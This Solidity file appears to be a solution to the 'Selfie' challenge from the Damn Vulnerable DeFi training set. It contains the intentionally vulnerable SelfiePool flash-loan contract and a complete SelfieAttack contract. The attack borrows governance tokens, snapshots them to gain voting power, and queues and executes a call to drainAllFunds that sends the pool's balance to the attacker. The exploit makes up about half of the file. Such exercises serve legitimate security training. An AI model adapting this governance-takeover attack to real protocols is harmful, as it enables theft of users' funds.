// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./SimpleGovernance.sol";

/**
 * @title SelfiePool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SelfiePool is ReentrancyGuard {
    using Address for address;

    ERC20Snapshot public token;
    SimpleGovernance public governance;

    event FundsDrained(address indexed receiver, uint256 amount);

    modifier onlyGovernance() {
        require(
            msg.sender == address(governance),
            "Only governance can execute this action"
        );
        _;
    }

    constructor(address tokenAddress, address governanceAddress) {
        token = ERC20Snapshot(tokenAddress);
        governance = SimpleGovernance(governanceAddress);
    }

    function flashLoan(uint256 borrowAmount) external nonReentrant {
        uint256 balanceBefore = token.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

        token.transfer(msg.sender, borrowAmount);

        require(msg.sender.isContract(), "Sender must be a deployed contract");
        msg.sender.functionCall(
            abi.encodeWithSignature(
                "receiveTokens(address,uint256)",
                address(token),
                borrowAmount
            )
        );

        uint256 balanceAfter = token.balanceOf(address(this));

        require(
            balanceAfter >= balanceBefore,
            "Flash loan hasn't been paid back"
        );
    }

    function drainAllFunds(address receiver) external onlyGovernance {
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);

        emit FundsDrained(receiver, amount);
    }
}

import "../DamnValuableTokenSnapshot.sol";

contract SelfieAttack {
    DamnValuableTokenSnapshot public token_snapshot;
    SelfiePool public selfiepool;
    SimpleGovernance public simple_governance;
    uint256 public action_id;

    constructor(
        address _token_snapshot,
        address _selfiepool,
        address _simple_governance
    ) public {
        token_snapshot = DamnValuableTokenSnapshot(_token_snapshot);
        selfiepool = SelfiePool(_selfiepool);
        simple_governance = SimpleGovernance(_simple_governance);
    }

    function planAttack() external {
        selfiepool.flashLoan(token_snapshot.balanceOf(address(selfiepool)));

        action_id = simple_governance.queueAction(
            address(selfiepool),
            abi.encodeWithSignature(
                "drainAllFunds(address)",
                address(msg.sender)
            ),
            0
        );
    }

    fallback() external {
        token_snapshot.snapshot();
        token_snapshot.transfer(
            address(selfiepool),
            token_snapshot.balanceOf(address(this))
        );
    }

    function executeAttack() external {
        simple_governance.executeAction(action_id);
    }
}
